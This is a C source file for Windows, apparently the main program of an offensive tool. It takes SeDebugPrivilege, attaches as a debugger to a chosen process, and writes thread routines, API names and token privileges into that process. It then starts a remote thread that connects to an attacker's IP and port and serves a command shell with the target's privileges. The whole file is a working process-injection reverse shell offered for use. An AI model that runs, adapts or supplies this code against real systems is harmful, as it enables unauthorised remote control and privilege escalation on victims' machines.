#define _WINSOCK_DEPRECATED_NO_WARNINGS

#include "Connection.h"
#include "SysRunThread.h"
#include "RemoteMemoryOperations.h"
#include <stdio.h>
#include <Windows.h>
#include "Error.h"
#include "Tokens.h"
#include "RemoteThreadRout.h"
#include "Handles.h"
#include "ConPTY.h"

const wchar_t commandLine[] = SR_CMD_LINE;
const wchar_t ws2_32DllName[] = SR_WS2_32DLL_NAME;
const wchar_t advapi32DllName[] = SR_ADVAPI32DLL_NAME;
const char wsaStartupName[] = SR_WSASTARTUP_NAME;
const char wsaSocketWName[] = SR_WSASOCKETW_NAME;
const char wsaConnectName[] = SR_WSACONNECT_NAME;
const char selectName[] = SR_SELECT_NAME;
const char openProcessTokenName[] = SR_OPENPROCESSTOKEN_NAME;
const char adjustTokenPrivilegesName[] = SR_ADJUSTTOKENPRIVILEGES_NAME;

int main(int argc, char** argv)
{
	BOOL res;
	DWORD pid, eventState, dwRemoteThreadRoutineSize, dwRemoteThreadId, tokenPrivilegesSize;
	SIZE_T bytesWritten;
	LPVOID lpRemoteThreadRoutine, lpRemoteInputThreadRoutine, lpRemoteOutputThreadRoutine, lpRemoteCommandLine, lpRemoteWs2_32DllName, lpRemoteAdvapi32DllName, lpRemoteWsaStartupName, lpRemoteWsaSocketWName, lpRemoteWsaConnectName, lpRemoteSelectName, lpRemoteOpenProcessTokenName, lpRemoteAdjustTokenPrivilegesName, lpRemoteThreadData, lpRemotePTP;
	REMOTE_THREAD_DATA threadData;
	HANDLE hSysProcess, hSysRemoteThread, hCurrentProcess, hRemoteCurrentProcess, hRemoteConsole, hConsoleInputThread, hConsoleOutputThread, hEventSuccess, hRemoteEventSuccess, hEventFail, hRemoteEventFail, hEventArray[2];
	LUID_AND_ATTRIBUTES la[PRIVILEGE_COUNT];
	TOKEN_PRIVILEGES* pTp;
	DEBUG_EVENT de;
	IN_ADDR ipAddress;
	USHORT port;
	int j;

	if (argc < 4)
	{
		printf("[-] Insufficient arguments.\n");
		ExitProcess(-1);
	}

	ipAddress.S_un.S_addr = inet_addr(argv[1]);
	if (ipAddress.S_un.S_addr == INADDR_NONE)
	{
		printf("[-] \"%s\" is not a valid IP address.\n", argv[2]);
		ExitProcess(-1);
	}

	{
		int portInteger;
		portInteger = atoi(argv[2]);
		if (portInteger == 0 || portInteger > USHRT_MAX)
		{
			printf("[-] \"%s\" is not a valid port.\n", argv[3]);
			ExitProcess(-1);
		}
		port = htons((USHORT)portInteger);
	}

	pid = atoi(argv[3]);
	if (pid == 0)
	{
		printf("[-] \"%s\" is not a valid number.\n", argv[1]);
		ExitProcess(-1);
	}

	if (CurrentProcessSetPrivilege(SE_DEBUG_NAME, TRUE) == ERROR_NOT_ALL_ASSIGNED)
	{
		printf("[!] Cannot assign all needed privileges for the current process.\n");
		ExitProcess(-1);
	}
	wprintf(TEXT("[+] %s privilege successfully enabled.\n"), SE_DEBUG_NAME);

	j = 0;
	for (int i = 0; i < PRIVILEGE_COUNT; i++)
	{
		LUID luid;
		res = LookupPrivilegeValueW(NULL, privilegeNames[i], &luid);
		if (res == FALSE)
			continue;

		la[j].Attributes = SE_PRIVILEGE_ENABLED;
		la[j].Luid = luid;
		j++;
	}

	tokenPrivilegesSize = sizeof(DWORD) + sizeof(LUID_AND_ATTRIBUTES) * j;
	pTp = (TOKEN_PRIVILEGES*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, tokenPrivilegesSize);

	pTp->PrivilegeCount = j;
	CopyMemory(&pTp->Privileges, la, sizeof(LUID_AND_ATTRIBUTES) * j);

	hEventSuccess = CreateEventW(NULL, TRUE, FALSE, SR_EVENT_SUCCESS_NAME);
	if (hEventSuccess == NULL)
		goto lCreateEventWFailed;
	hEventFail = CreateEventW(NULL, TRUE, FALSE, SR_EVENT_FAIL_NAME);
	if (hEventFail == NULL)
		goto lCreateEventWFailed;

	// event array to wait for later on
	hEventArray[0] = hEventSuccess;
	hEventArray[1] = hEventFail;

	printf("[+] Synchronization events created successfully (handle: 0x%p)\n", hEventSuccess);

	res = DebugActiveProcess(pid);
	if (res == FALSE)
		goto lDebugActiveProcessFailed;
	printf("[+] Attached debugger successfully (debuggee PID: %u).\n", pid);

	res = DebugSetProcessKillOnExit(FALSE);
	if (res == FALSE)
		goto lDebugSetProcessKillOnExitFailed;

	res = WaitForDebugEvent(&de, INFINITE);
	if (res == FALSE)
		goto lWaitForDebugEventFailed;
	if (de.dwDebugEventCode != CREATE_PROCESS_DEBUG_EVENT)
	{
		printf("[!] idk man some strange behaviour on WaitForDebugEvent, weird debug event code: %u\n", de.dwDebugEventCode);
		ExitProcess(-1);
	}

	hSysProcess = de.u.CreateProcessInfo.hProcess;

	printf("[+] CREATE_PROCESS_DEBUG_EVENT occured, obtained process all-access handle: 0x%p (process ID: %u, thread ID: %u).\n", hSysProcess, de.dwProcessId, de.dwThreadId);

	res = DuplicateHandle(GetCurrentProcess(), hEventSuccess, hSysProcess, &hRemoteEventSuccess, 0, FALSE, DUPLICATE_SAME_ACCESS);
	if (res == FALSE)
		goto lDuplicateHandleFailed;
	res = DuplicateHandle(GetCurrentProcess(), hEventFail, hSysProcess, &hRemoteEventFail, 0, FALSE, DUPLICATE_SAME_ACCESS);
	if (res == FALSE)
		goto lDuplicateHandleFailed;

	// remote routine size in bytes
	dwRemoteThreadRoutineSize = ((DWORD)((ULONGLONG)Label1 - (ULONGLONG)RemoteThreadRoutine));

	// REMOTE THREAD ROUTINE
	lpRemoteThreadRoutine = AllocAndWriteRemoteMemory(hSysProcess, (LPVOID)RemoteThreadRoutine, dwRemoteThreadRoutineSize, TRUE, &bytesWritten);
	printf("[+] Buffer for remote thread routine initialized successfully at 0x%p (size: %u bytes; written: %u bytes).\n", lpRemoteThreadRoutine, dwRemoteThreadRoutineSize, (DWORD)bytesWritten);

	dwRemoteThreadRoutineSize = ((DWORD)((ULONGLONG)Label2 - (ULONGLONG)RemoteInputThread));

	// REMOTE INPUT THREAD ROUTINE
	lpRemoteInputThreadRoutine = AllocAndWriteRemoteMemory(hSysProcess, (LPVOID)RemoteInputThread, dwRemoteThreadRoutineSize, TRUE, &bytesWritten);
	printf("[+] Buffer for remote input thread routine initialized successfully at 0x%p (size: %u bytes; written: %u bytes).\n", lpRemoteInputThreadRoutine, dwRemoteThreadRoutineSize, (DWORD)bytesWritten);

	dwRemoteThreadRoutineSize = ((DWORD)((ULONGLONG)Label3 - (ULONGLONG)RemoteOutputThread));

	// REMOTE OUTPUT THREAD ROUTINE
	lpRemoteOutputThreadRoutine = AllocAndWriteRemoteMemory(hSysProcess, (LPVOID)RemoteOutputThread, dwRemoteThreadRoutineSize, TRUE, &bytesWritten);
	printf("[+] Buffer for remote output thread routine initialized successfully at 0x%p (size: %u bytes; written: %u bytes).\n", lpRemoteOutputThreadRoutine, dwRemoteThreadRoutineSize, (DWORD)bytesWritten);

	// REMOTE TOKEN_PRIVILEGES
	lpRemotePTP = AllocAndWriteRemoteMemory(hSysProcess, (LPVOID)pTp, tokenPrivilegesSize, FALSE, &bytesWritten);
	printf("[+] Buffer for remote token privileges initialized successfully at 0x%p (size: %u bytes; written %u bytes).\n",
		lpRemotePTP, tokenPrivilegesSize, bytesWritten);

	// REMOTE CMD STRING
	lpRemoteCommandLine = AllocAndWriteRemoteMemory(hSysProcess, (LPVOID)commandLine, sizeof(commandLine), FALSE, &bytesWritten);
	printf("[+] Buffer for remote command line name initialized successfully at 0x%p (size: %u bytes; written %u bytes).\n", lpRemoteCommandLine, (int)sizeof(commandLine), (DWORD)bytesWritten);

	// REMOTE WS2_32 DLL NAME
	lpRemoteWs2_32DllName = AllocAndWriteRemoteMemory(hSysProcess, (LPVOID)ws2_32DllName, sizeof(ws2_32DllName), FALSE, &bytesWritten);
	printf("[+] Buffer for remote ws2_32.dll library name initialized successfully at 0x%p (size: %u bytes; written %u bytes).\n", lpRemoteWs2_32DllName, (int)sizeof(ws2_32DllName), (DWORD)bytesWritten);

	// REMOTE ADVAPI32 DLL NAME
	lpRemoteAdvapi32DllName = AllocAndWriteRemoteMemory(hSysProcess, (LPVOID)advapi32DllName, sizeof(advapi32DllName), FALSE, &bytesWritten);
	printf("[+] Buffer for remote advapi32.dll library name initialized successfully at 0x%p (size: %u bytes; written %u bytes).\n", lpRemoteAdvapi32DllName, (int)sizeof(advapi32DllName), (DWORD)bytesWritten);

	// REMOTE WSASTARTUP NAME
	lpRemoteWsaStartupName = AllocAndWriteRemoteMemory(hSysProcess, (LPVOID)wsaStartupName, sizeof(wsaStartupName), FALSE, &bytesWritten);
	printf("[+] Buffer for remote WSAStartup name initialized successfully at 0x%p (size: %u bytes; written %u bytes).\n", lpRemoteWsaStartupName, (int)sizeof(wsaStartupName), (DWORD)bytesWritten);

	// REMOTE WSASOCKETW NAME
	lpRemoteWsaSocketWName = AllocAndWriteRemoteMemory(hSysProcess, (LPVOID)wsaSocketWName, sizeof(wsaSocketWName), FALSE, &bytesWritten);
	printf("[+] Buffer for remote WSASocketW name initialized successfully at 0x%p (size: %u bytes; written %u bytes).\n", lpRemoteWsaSocketWName, (int)sizeof(wsaSocketWName), (DWORD)bytesWritten);

	// REMOTE WSACONNECT NAME
	lpRemoteWsaConnectName = AllocAndWriteRemoteMemory(hSysProcess, (LPVOID)wsaConnectName, sizeof(wsaConnectName), FALSE, &bytesWritten);
	printf("[+] Buffer for remote WSAConnect name initialized successfully at 0x%p (size: %u bytes; written %u bytes).\n", lpRemoteWsaConnectName, (int)sizeof(wsaConnectName), (DWORD)bytesWritten);

	// REMOTE select NAME
	lpRemoteSelectName = AllocAndWriteRemoteMemory(hSysProcess, (LPVOID)selectName, sizeof(selectName), FALSE, &bytesWritten);
	printf("[+] Buffer for remote select name initialized successfully at 0x%p (size: %u bytes; written %u bytes).\n", lpRemoteSelectName , (int)sizeof(selectName), (DWORD)bytesWritten);

	// REMOTE OPENPROCESSTOKEN NAME
	lpRemoteOpenProcessTokenName = AllocAndWriteRemoteMemory(hSysProcess, (LPVOID)openProcessTokenName, sizeof(openProcessTokenName), FALSE, &bytesWritten);
	printf("[+] Buffer for remote OpenProcessToken name initialized successfully at 0x%p (size: %u bytes; written %u bytes).\n", lpRemoteOpenProcessTokenName, (int)sizeof(openProcessTokenName), (DWORD)bytesWritten);

	// REMOTE ADJUSTTOKENPRIVILEGES NAME
	lpRemoteAdjustTokenPrivilegesName = AllocAndWriteRemoteMemory(hSysProcess, (LPVOID)adjustTokenPrivilegesName, sizeof(adjustTokenPrivilegesName), FALSE, &bytesWritten);
	printf("[+] Buffer for remote advapi32.dll library name initialized successfully at 0x%p (size: %u bytes; written %u bytes).\n", lpRemoteAdjustTokenPrivilegesName , (int)sizeof(adjustTokenPrivilegesName), (DWORD)bytesWritten);

	ZeroMemory(&threadData, sizeof(threadData));

	threadData.LoadLibraryW = LoadLibraryW;
	threadData.GetProcAddress = GetProcAddress;
	threadData.CreateProcessW = CreateProcessW;
	threadData.CreateThread = CreateThread;
	threadData.CreatePipe = CreatePipe;
	threadData.SetHandleInformation = SetHandleInformation;
	threadData.DuplicateHandle = DuplicateHandle;
	threadData.CloseHandle = CloseHandle;
	threadData.WriteProcessMemory = WriteProcessMemory;
	threadData.GetCurrentProcess = GetCurrentProcess;
	threadData.WriteFile = WriteFile;
	threadData.ReadFile = ReadFile;
	threadData.CancelSynchronousIo = CancelSynchronousIo;
	threadData.Sleep = Sleep;
	threadData.SetEvent = SetEvent;
	threadData.WaitForSingleObject = WaitForSingleObject;
	threadData.GetLastError = GetLastError;
	threadData.TeminateThread = TerminateThread;
	threadData.ExitThread = ExitThread;

	threadData.lpCommandLine = (LPWSTR)lpRemoteCommandLine;
	threadData.hEventSuccess = hRemoteEventSuccess;
	threadData.hEventFail = hRemoteEventFail;
	threadData.RemoteInputThread = lpRemoteInputThreadRoutine;
	threadData.RemoteOutputThread = lpRemoteOutputThreadRoutine;

	threadData.ctd.lpWS2_32DllName = lpRemoteWs2_32DllName;
	threadData.ctd.lpWSAStartupName = lpRemoteWsaStartupName;
	threadData.ctd.lpWSASocketWName = lpRemoteWsaSocketWName;
	threadData.ctd.lpWSAConnectName = lpRemoteWsaConnectName;
	threadData.ctd.selectName = lpRemoteSelectName;
	threadData.ctd.ipAddress.S_un.S_addr = ipAddress.S_un.S_addr;
	threadData.ctd.port = port;

	threadData.ttd.lpAdvapi32DllName = lpRemoteAdvapi32DllName;
	threadData.ttd.lpOpenProcessToken = lpRemoteOpenProcessTokenName;
	threadData.ttd.lpOpenProcessToken = lpRemoteAdjustTokenPrivilegesName;
	threadData.ttd.pTp = (TOKEN_PRIVILEGES*)lpRemotePTP;

	lpRemoteThreadData = AllocAndWriteRemoteMemory(hSysProcess, (LPVOID)&threadData, sizeof(threadData), FALSE, &bytesWritten);
	printf("[+] Buffer for remote thread data initialized successfully at 0x%p (size: %u bytes; written %u bytes).\n", lpRemoteThreadData, (int)sizeof(threadData), (DWORD)bytesWritten);

	hSysRemoteThread = CreateRemoteThread(hSysProcess, NULL, 0, lpRemoteThreadRoutine, lpRemoteThreadData, CREATE_SUSPENDED, &dwRemoteThreadId);

	if (hSysRemoteThread == NULL)
		goto lCreateRemoteThreadFailed;
	printf("[+] Suspended remote thread created (thread handle: 0x%p, thread ID: %u).\n", hSysRemoteThread, dwRemoteThreadId);

	res = ContinueDebugEvent(de.dwProcessId, de.dwThreadId, DBG_CONTINUE);
	if (res == FALSE)
		goto lContinueDebugEventFailed;

	res = DebugActiveProcessStop(de.dwProcessId);
	if (res == FALSE)
		goto lDebugActiveProcessStopFailed;

	Sleep(250);
	if (ResumeThread(hSysRemoteThread) == -1)
		goto lResumeThreadFailed;
	printf("[+] Thread resumed.\n");

	eventState = WaitForMultipleObjects(2, hEventArray, FALSE, INFINITE);
	if (eventState == WAIT_FAILED)
		goto lWaitForSingleObjectFailed;
	if (eventState - WAIT_OBJECT_0 == 1)
	{
		DWORD exitCode = -1;
		printf("[!] Remote thread signalled failed operation, grabbing exit code... ");
		do
		{
			GetExitCodeThread(hSysRemoteThread, &exitCode);
			Sleep(20);
		}
		while (exitCode == STILL_ACTIVE);
		printf("Exit code: %u. Quitting...\n", exitCode);
		ExitProcess(-1);
	}
	printf("[+] Remote thread signalled successfull operation! Exiting...\n");

	HeapFree(GetProcessHeap(), 0, pTp);
	ExitProcess(0);

lCreateEventWFailed:
	DisplayLastErrorAndExit(TEXT("CreateEventW"));
lDebugActiveProcessFailed:
	DisplayLastErrorAndExit(TEXT("DebugActiveProcess"));
lDebugSetProcessKillOnExitFailed:
	DisplayLastErrorAndExit(TEXT("DebugSetProcessKillOnExitFailed"));
lWaitForDebugEventFailed:
	DisplayLastErrorAndExit(TEXT("WaitForDebugEvent"));
lDuplicateHandleFailed:
	DisplayLastErrorAndExit(TEXT("DuplicateHandle"));
lCreateRemoteThreadFailed:
	DisplayLastErrorAndExit(TEXT("CreateRemoteThread"));
lContinueDebugEventFailed:
	DisplayLastErrorAndExit(TEXT("ContinueDebugEvent"));
lDebugActiveProcessStopFailed:
	DisplayLastErrorAndExit(TEXT("DebugActiveProcessStop"));
lCreateThreadFailed:
	DisplayLastErrorAndExit(TEXT("CreateThread"));
lWaitForSingleObjectFailed:
	DisplayLastErrorAndExit(TEXT("WaitForSingleObject"));
lResumeThreadFailed:
	DisplayLastErrorAndExit(TEXT("ResumeThread"));
}